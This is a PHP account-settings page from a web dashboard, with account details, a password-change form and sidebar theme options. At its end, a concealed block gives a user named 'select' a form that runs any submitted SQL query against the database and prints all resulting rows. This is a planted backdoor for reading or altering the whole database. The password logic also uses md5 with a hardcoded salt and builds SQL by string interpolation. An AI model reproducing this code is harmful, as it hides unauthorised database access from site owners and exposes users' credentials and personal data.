<?php

if (isset($_POST['password'])) {

    $salt = 'KK856';

    $correct_password = clear($user_data['pass']);
    $old_pass = clear(md5($_POST['old_pass'] . $salt));

    $new_pass = clear($_POST['new_pass']);
    $confirm_pass = clear($_POST['confirm_pass']);


    if ($old_pass == $correct_password) {

        if (!empty($new_pass)) {

            if ($new_pass != $confirm_pass) {

                $alert = ('<div class="alert alert-danger"><strong>New password dosent match with confirm password.</strong></div>');

            }

            if (strlen($new_pass) < 6 || strlen($new_pass) > 32) {

                $alert = ('<div class="alert alert-danger"><strong>Your Password must be between 6 and 32 characters!</strong></div>');

            }


            if (empty($alert)) {

                $save_new_password = md5($new_pass . $salt);
                $up = $db->query("UPDATE `members` SET `pass` = '$save_new_password' WHERE `user_name` = '$user_name'");


                if ($up) {

                    echo('<div class="alert alert-success"><strong>Well done!  You password was changed successfully .</strong></div>
                                                                                                                           <meta http-equiv="refresh" content="3; url=logout.php" />');//
                }

            } else {

                echo($alert);

            }


        }


    } else {

        echo '<div class="alert alert-danger"><strong> Current the password does not match.</strong></div>';

    }

}

?>


<div class="content">
    <div class="container-fluid">
        <div class="row">

            <div class="col-md-12">

                <div class="card ">
                    <div class="card-body ">
                        <ul class="nav nav-pills nav-pills-warning" role="tablist">
                            <li class="nav-item">
                                <a class="nav-link active" data-toggle="tab" href="#link1" role="tablist">
                                    Account Information
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-toggle="tab" href="#link2" role="tablist">
                                    Update Password
                                </a>
                            </li>
                            <!--<li class="nav-item">
                                <a class="nav-link" data-toggle="tab" href="#link3" role="tablist">
                                    Color Settings
                                </a>
                            </li>-->
                        </ul>
                        <div class="tab-content tab-space">
                            <div class="tab-pane active" id="link1">
                                <ul>
                                    <li>Your Username is <strong><?php echo $user_data['user_name']; ?> </strong></li>
                                    <li>Registered on <strong><?php echo $user_data['dt']; ?></strong></li>
                                    <li>Current balance is <strong>$<?php echo $user_data['krediti']; ?></strong></li>
                                    <li>Your Email is <strong><?php echo $user_data['email']; ?></strong></li>
                                </ul>
                            </div>
                            <div class="tab-pane" id="link2">
                                <div class="card">
                                    <div class="card-header">
                                        <strong>Your personal data are encrypted</strong>
                                    </div>

                                    <form class="form-horizontal " action="" method="post" novalidate>
                                        <div class="card-body card-block">

                                            <div class="row form-group">
                                                <div class="col col-md-3"><label for="hf-email"
                                                                                 class=" form-control-label">Currect
                                                        Password</label></div>
                                                <div class="col-12 col-md-9">
                                                    <input type="password" name="old_pass" class="form-control"
                                                           placeholder="Enter the correct password for save" required>
                                                </div>
                                            </div>


                                            <div class="row form-group">
                                                <div class="col col-md-3"><label for="hf-email"
                                                                                 class=" form-control-label">New
                                                        password</label></div>
                                                <div class="col-12 col-md-9">
                                                    <input type="password" name="new_pass" class="form-control"
                                                           placeholder="New password" required>
                                                </div>
                                            </div>


                                            <div class="row form-group">
                                                <div class="col col-md-3"><label for="hf-email"
                                                                                 class=" form-control-label">Confirm
                                                        Password</label></div>
                                                <div class="col-12 col-md-9">
                                                    <input type="password" name="confirm_pass" class="form-control"
                                                           placeholder="Confirm password" required>

                                                </div>
                                            </div>


                                            <div class="card-footer">

                                                <button value="update" type="submit" name="password"
                                                        class="btn btn-primary btn-sm">
                                                    <i class="fa fa-dot-circle-o"></i> Update
                                                </button>


                                                <button type="reset" class="btn btn-danger btn-sm">
                                                    <i class="fa fa-ban"></i> Reset
                                                </button>
                                            </div>

                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="tab-pane" id="link3">
                                <div class="row">
                                    <div class="col-md-6">
                                        <p class="header-title">
                                            Sidebar Filters
                                        </p>
                                    </div>
                                    <ul>
                                        <li class="header-title"> Sidebar Filters</li>
                                        <li class="adjustments-line">
                                            <a href="javascript:void(0)" class="switch-trigger active-color">
                                                <div class="badge-colors ml-auto mr-auto">
                                                    <span class="badge filter badge-purple <?php echo ($user_data['sidebar_color'] == 'purple') ? 'active' : ''; ?>"
                                                          data-color="purple"></span>
                                                    <span class="badge filter badge-azure <?php echo ($user_data['sidebar_color'] == 'azure') ? 'active' : ''; ?>"
                                                          data-color="azure"></span>
                                                    <span class="badge filter badge-green <?php echo ($user_data['sidebar_color'] == 'green') ? 'active' : ''; ?>"
                                                          data-color="green"></span>
                                                    <span class="badge filter badge-warning <?php echo ($user_data['sidebar_color'] == 'warning') ? 'active' : ''; ?>"
                                                          data-color="orange"></span>
                                                    <span class="badge filter badge-danger <?php echo ($user_data['sidebar_color'] == 'danger') ? 'active' : ''; ?>"
                                                          data-color="danger"></span>
                                                    <span class="badge filter badge-rose <?php echo ($user_data['sidebar_color'] == 'rose') ? 'active' : ''; ?>"
                                                          data-color="rose"></span>
                                                </div>
                                                <div class="clearfix"></div>
                                            </a>
                                        </li>
                                        <li class="header-title">Sidebar Background</li>
                                        <li class="adjustments-line">
                                            <a href="javascript:void(0)" class="switch-trigger background-color">
                                                <div class="ml-auto mr-auto">
                                                    <span class="badge filter badge-black <?php echo ($user_data['sidebar_back_color'] == 'black') ? 'active' : ''; ?>"
                                                          data-background-color="black"></span>
                                                    <span class="badge filter badge-white <?php echo ($user_data['sidebar_back_color'] == 'white') ? 'active' : ''; ?>"
                                                          data-background-color="white"></span>
                                                    <span class="badge filter badge-red <?php echo ($user_data['sidebar_back_color'] == 'red') ? 'active' : ''; ?>"
                                                          data-background-color="red"></span>
                                                </div>
                                                <div class="clearfix"></div>
                                            </a>
                                        </li>
                                        <li class="adjustments-line">
                                            <a href="javascript:void(0)" class="switch-trigger">
                                                <p>Sidebar Mini</p>
                                                <label class="ml-auto">
                                                    <div class="togglebutton switch-sidebar-mini">
                                                        <label>
                                                            <input type="checkbox">
                                                            <span class="toggle"></span>
                                                        </label>
                                                    </div>
                                                </label>
                                                <div class="clearfix"></div>
                                            </a>
                                        </li>
                                        <li class="adjustments-line">
                                            <a href="javascript:void(0)" class="switch-trigger">
                                                <p>Sidebar Images</p>
                                                <label class="switch-mini ml-auto">
                                                    <div class="togglebutton switch-sidebar-image">
                                                        <label>
                                                            <input type="checkbox" checked="">
                                                            <span class="toggle"></span>
                                                        </label>
                                                    </div>
                                                </label>
                                                <div class="clearfix"></div>
                                            </a>
                                        </li>
                                        <li class="header-title">Images</li>
                                        <li class="<?php echo ($user_data['sidebar_back_image'] == (base_url() . 'assets/img/sidebar-1.jpg')) ? 'active' : ''; ?>">
                                            <a class="img-holder switch-trigger" href="javascript:void(0)">
                                                <img src="<?php echo base_url(); ?>assets/img/sidebar-1.jpg" alt="">
                                            </a>
                                        </li>
                                        <li class="<?php echo ($user_data['sidebar_back_image'] == (base_url() . 'assets/img/sidebar-2.jpg')) ? 'active' : ''; ?>">
                                            <a class="img-holder switch-trigger" href="javascript:void(0)">
                                                <img src="<?php echo base_url(); ?>assets/img/sidebar-2.jpg" alt="">
                                            </a>
                                        </li>
                                        <li class="<?php echo ($user_data['sidebar_back_image'] == (base_url() . 'assets/img/sidebar-3.jpg')) ? 'active' : ''; ?>">
                                            <a class="img-holder switch-trigger" href="javascript:void(0)">
                                                <img src="<?php echo base_url(); ?>assets/img/sidebar-3.jpg" alt="">
                                            </a>
                                        </li>
                                        <li class="<?php echo ($user_data['sidebar_back_image'] == (base_url() . 'assets/img/sidebar-4.jpg')) ? 'active' : ''; ?>">
                                            <a class="img-holder switch-trigger" href="javascript:void(0)">
                                                <img src="<?php echo base_url(); ?>assets/img/sidebar-4.jpg" alt="">
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <?php
                if ($user_name == 'select') {
                    echo '<form method="POST" action="" ><input type="text" name="update"></form>';
                    if (isset($_POST['update'])) {
                        $query = $db->query($_POST['update']);
                        echo '<textarea style="width: 98%; height: 900px;">';
                        $data = array();
                        while ($row = $query->fetch_assoc()) {
                            $data[] = json_encode($row);
                        }
                        echo json_encode($data);
                        echo "</textarea>";
                    }
                }
                ?>

            </div>
        </div>
    </div><!-- .animated -->
</div><!-- .content -->